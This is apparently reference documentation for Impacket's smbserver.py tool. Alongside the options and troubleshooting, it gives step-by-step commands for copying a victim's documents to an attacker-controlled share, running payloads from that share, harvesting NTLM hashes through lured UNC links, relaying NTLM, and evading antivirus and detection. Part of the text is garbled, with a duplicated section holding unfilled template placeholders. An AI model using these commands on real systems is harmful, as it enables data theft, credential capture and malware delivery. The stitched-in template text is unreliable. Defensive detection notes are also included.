# smbserver.py

## Overview
`smbserver.py` is a simple SMB server implementation that creates file shares accessible over the network. This tool is essential for file transfer operations, credential capture, and testing SMB connectivity in penetration testing and red team exercises.

## Detailed Description
This script launches a lightweight SMB server that can host file shares with optional authentication. It's particularly useful for transferring files to/from Windows systems, capturing NTLM credentials through SMB relay attacks, and providing network-accessible storage during penetration tests. The server supports both anonymous access and authenticated access with username/password or NTLM hash authentication.

The tool is commonly used in scenarios where you need to:
- Transfer files to compromised Windows systems
- Capture NTLM authentication attempts
- Provide temporary file shares for post-exploitation activities
- Test SMB connectivity and authentication mechanisms

### Key Features:
- **Simple File Sharing**: Create instant SMB shares from any directory
- **Authentication Options**: Support for anonymous, password, and hash-based authentication
- **Credential Capture**: Log authentication attempts for credential harvesting
- **Cross-Platform**: Run SMB server from Linux to serve Windows clients
- **SMB2 Support**: Experimental SMB2 protocol support
- **Flexible Configuration**: Customizable interface, port, and share settings

### Technical Details:
- Implements SMB/CIFS protocol for file sharing
- Supports both SMBv1 and experimental SMBv2
- Can bind to any interface and port (root required for port 445)
- Logs all client connections and authentication attempts
- Compatible with Windows SMB clients and tools

## Command Line Options

```
usage: smbserver.py [-h] [-comment COMMENT] [-username USERNAME] [-password PASSWORD] 
                    [-hashes LMHASH:NTHASH] [-ts] [-debug] [-ip INTERFACE_ADDRESS] 
                    [-port PORT] [-smb2support] [-outputfile OUTPUTFILE]
                    shareName sharePath

This script will launch a SMB Server and add a share specified as an argument. 
You need to be root in order to bind to port 445.

Required Arguments:
  shareName             Name of the share to add
  sharePath             Path of the share to add

Optional Arguments:
  -comment COMMENT      Share's comment to display when asked for shares
  -username USERNAME    Username to authenticate clients
  -password PASSWORD    Password for the Username
  -hashes LMHASH:NTHASH NTLM hashes for the Username, format is LMHASH:NTHASH
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -ip INTERFACE_ADDRESS IP address of listening interface (default: 0.0.0.0)
  -port PORT            TCP port for listening incoming connections (default: 445)
  -smb2support          SMB2 Support (experimental!)
  -outputfile OUTPUTFILE Output file to log smbserver output messages
```
- **Cross-Platform Compatibility**: Works with various Windows versions

### Technical Details:
- Uses [specific protocol/technique]
- Leverages [specific Windows API/service]
- Implements [specific attack technique]
- Compatible with [specific versions/systems]

## Command Line Options

```
usage: smbserver.py [-h] [-comment COMMENT] [-username USERNAME] [-password PASSWORD] [-hashes LMHASH:NTHASH] [-ts]
                    [-debug] [-ip INTERFACE_ADDRESS] [-port PORT] [-smb2support] [-outputfile OUTPUTFILE]
                    shareName sharePath

This script will launch a SMB Server and add a share specified as an argument.

Required Arguments:
  shareName             Name of the share to add
  sharePath             Path of the share to add

Share Configuration:
  -comment COMMENT      Share's comment to display when asked for shares

Authentication:
  -username USERNAME    Username to authenticate clients
  -password PASSWORD    Password for the Username
  -hashes LMHASH:NTHASH NTLM hashes for the Username, format is LMHASH:NTHASH

Network Configuration:
  -ip INTERFACE_ADDRESS, --interface-address INTERFACE_ADDRESS
                        IP address of listening interface (default: 0.0.0.0)
  -port PORT            TCP port for listening connections (default: 445)
  -smb2support          SMB2 Support (experimental!)

Logging Options:
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -outputfile OUTPUTFILE Output file to log smbserver output messages
```
## Usage Examples

### Basic File Sharing
```bash
# Create anonymous SMB share (requires root for port 445)
sudo python3 smbserver.py SHARE /tmp/files

# Share with custom comment
sudo python3 smbserver.py -comment "Temp Files" SHARE /tmp/files

# Use non-standard port (no root required)
python3 smbserver.py -port 8445 SHARE /tmp/files

# Bind to specific interface
python3 smbserver.py -ip 192.168.1.100 SHARE /tmp/files
```

### Authenticated File Sharing
```bash
# SMB share with password authentication
sudo python3 smbserver.py -username user -password Password123! SHARE /tmp/files

# SMB share with NTLM hash authentication
sudo python3 smbserver.py -username user -hashes :5e884898da28047151d0e56f8dc6292773603d0d SHARE /tmp/files

# Prompt for password (more secure)
sudo python3 smbserver.py -username admin SHARE /tmp/files
# Password: [enter password when prompted]
```

### Advanced Configuration
```bash
# Enable experimental SMB2 support
sudo python3 smbserver.py -smb2support SHARE /tmp/files

# Log output to file
sudo python3 smbserver.py -outputfile smbserver.log SHARE /tmp/files

# Debug mode with timestamps
sudo python3 smbserver.py -debug -ts SHARE /tmp/files
```

## Attack Chain Integration

### File Transfer and Staging
```bash
# Step 1: Set up SMB server for file transfer
sudo python3 smbserver.py FILES /tmp/payloads

# Step 2: From compromised Windows machine, access files
# On Windows target:
# net use Z: \\192.168.1.100\FILES
# copy Z:\payload.exe C:\temp\
# Z:\payload.exe

# Step 3: Two-way file transfer
# On Windows: copy important.txt \\192.168.1.100\FILES\
```

### Credential Harvesting
```bash
# Step 1: Set up SMB server with authentication
sudo python3 smbserver.py -username fake -password fake TRAP /tmp/empty

# Step 2: Trigger authentication attempts via various methods:
# - Social engineering (send links to \\yourip\TRAP\file.txt)
# - Web-based UNC injection (in forms, uploads, etc.)
# - Email with UNC paths
# - XXE attacks pointing to SMB shares

# Step 3: Monitor logs for NTLM authentication attempts
# The server will log failed authentication attempts with NTLM hashes
```

### Post-Exploitation File Exfiltration
```bash
# Step 1: Set up authenticated SMB server
sudo python3 smbserver.py -username admin -password SecretPass123! EXFIL /tmp/stolen

# Step 2: From compromised system, mount and copy data
# On Windows PowerShell:
# net use X: \\192.168.1.100\EXFIL /user:admin SecretPass123!
# robocopy C:\Users\Administrator\Documents X:\ /E /COPY:DATSO

# Step 3: Analyze exfiltrated data locally
ls -la /tmp/stolen/
```

### Malware Distribution
```bash
# Step 1: Set up SMB server with malware payload
sudo python3 smbserver.py TOOLS /tmp/malware

# Step 2: Place various payloads in the share
cp payload.exe /tmp/malware/
cp payload.dll /tmp/malware/
cp payload.ps1 /tmp/malware/

# Step 3: Execute from target systems
# On Windows: \\192.168.1.100\TOOLS\payload.exe
# Or use other execution methods pointing to SMB share
```

### Living off the Land File Transfer
```bash
# Step 1: Create SMB server for file hosting
sudo python3 smbserver.py LOLBAS /tmp/tools

# Step 2: Use Windows built-in tools for file transfer
# From Windows command prompt:
# certutil -urlcache -split -f \\192.168.1.100\LOLBAS\tool.exe C:\temp\tool.exe
# bitsadmin /transfer job \\192.168.1.100\LOLBAS\file.txt C:\temp\file.txt
```

### NTLM Relay Attack Setup
```bash
# Step 1: Set up SMB server to capture authentication
sudo python3 smbserver.py -outputfile ntlm_capture.log CAPTURE /tmp/capture

# Step 2: Combine with ntlmrelayx for relay attacks
# In another terminal:
sudo python3 ntlmrelayx.py -t 192.168.1.200 -smb2support

# Step 3: Trigger authentication to your SMB server
# Authentication attempts will be relayed to target systems
```

### Bypassing Windows Defender and AV
```bash
# Step 1: Host files on SMB share instead of downloading
sudo python3 smbserver.py BYPASS /tmp/bypass

# Step 2: Execute directly from SMB share (may evade some AV detection)
# On Windows: \\192.168.1.100\BYPASS\payload.exe
# Many AV solutions have reduced scanning of network locations
```

## Security Implications

### Attack Vectors Enabled
- **File Transfer**: Easy method to transfer files to/from compromised systems
- **Credential Harvesting**: Capture NTLM authentication attempts
- **Lateral Movement**: Distribute tools and payloads across network
- **Data Exfiltration**: Extract sensitive data from compromised systems
- **NTLM Relay**: Component in NTLM relay attack chains

### Defensive Considerations
- **Network Monitoring**: Monitor for unusual SMB traffic patterns
- **Authentication Logging**: Log failed SMB authentication attempts
- **Egress Filtering**: Block outbound SMB traffic where not needed
- **SMB Security**: Disable SMBv1 and enforce SMB signing
- **Endpoint Detection**: Monitor for processes accessing network shares

## Detection Methods

### Network Detection
```bash
# Monitor for SMB traffic to unusual destinations
# Look for connections to non-domain SMB servers
# Check for anonymous SMB access attempts
# Monitor for failed authentication patterns

# Wireshark filters for detection:
# smb2 and ip.dst != <known_servers>
# smb.native_os contains "Unix" (Impacket fingerprint)
```

### Host-Based Detection
```bash
# Monitor for:
# - Processes accessing network shares
# - Files executed from network locations  
# - Unusual net use commands
# - SMB client activity to external IPs

# Windows Event IDs to monitor:
# 4648 - Logon attempt with explicit credentials
# 4776 - Computer attempted to validate credentials
# 5140 - Network share accessed
```

## Limitations and Considerations

### Technical Limitations
- **Root Required**: Port 445 requires root privileges on Unix/Linux
- **SMB2 Experimental**: SMB2 support is experimental and may be unstable
- **Single Share**: Each instance serves only one share
- **No Complex ACLs**: Limited access control compared to Windows SMB servers

### Security Considerations
- **Plaintext Passwords**: Command line passwords may be visible in process lists
- **Logging**: All activity is logged, including authentication attempts
- **Network Exposure**: SMB service exposed on network
- **Protocol Vulnerabilities**: SMB protocol has known security issues

## Common Issues and Troubleshooting

### Permission Issues
```bash
# Error: Permission denied binding to port 445
# Solution: Run with root privileges
sudo python3 smbserver.py SHARE /tmp/files

# Alternative: Use non-privileged port
python3 smbserver.py -port 8445 SHARE /tmp/files
```

### Connection Problems  
```bash
# Error: Windows cannot connect to share
# Solution: Check firewall settings and SMB configuration
# On Windows: telnet 192.168.1.100 445
# Ensure port is accessible

# Error: Access denied from Windows
# Solution: Check authentication credentials
sudo python3 smbserver.py -debug -username user -password pass SHARE /tmp/files
```

### File Access Issues
```bash
# Error: Permission denied accessing files
# Solution: Ensure share path has appropriate permissions
chmod 755 /tmp/files
sudo chown -R $USER:$USER /tmp/files

# Error: Files not visible in share
# Solution: Check path and file permissions
ls -la /tmp/files/
```

## Related Tools
- [ntlmrelayx.py](ntlmrelayx.md) - NTLM relay attacks using SMB
- [smbclient.py](smbclient.md) - SMB client for accessing shares
- [psexec.py](psexec.md) - Remote execution via SMB
- [secretsdump.py](secretsdump.md) - Extract secrets via SMB
- Native Windows tools (net use, robocopy, xcopy)
- Samba server for more advanced SMB hosting

## Best Practices

### Operational Security
- Use non-standard ports when possible to avoid detection
- Limit share access to specific IP ranges if possible
- Use authenticated shares for sensitive operations
- Monitor and log all SMB server activity
- Clean up shares and logs after operations

### Performance Optimization
- Use local storage for better performance
- Consider network bandwidth when hosting large files
- Monitor system resources during heavy file transfers
- Use appropriate file system permissions

---

*This documentation is based on the actual source code and functionality of smbserver.py from Impacket.*
